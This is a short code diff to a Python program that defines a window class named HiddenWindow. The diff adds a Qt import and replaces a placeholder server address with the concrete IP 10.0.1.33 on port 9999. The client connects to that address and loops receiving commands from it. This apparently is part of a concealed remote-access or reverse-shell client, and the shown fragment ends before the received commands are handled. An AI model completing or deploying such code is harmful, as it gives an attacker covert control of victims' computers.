@@ -2,6 +2,7 @@ import socket
 import os
 import sys
 from PyQt5.QtWidgets import QApplication, QMainWindow
+from PyQt5.QtCore import Qt
 
 class HiddenWindow(QMainWindow):
     def __init__(self):
@@ -17,7 +18,7 @@ def main():
     window = HiddenWindow()
 
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client.connect(('SERVER_IP', 9999))
+    client.connect(('10.0.1.33', 9999))
 
     while True:
         command = client.recv(1024).decode()
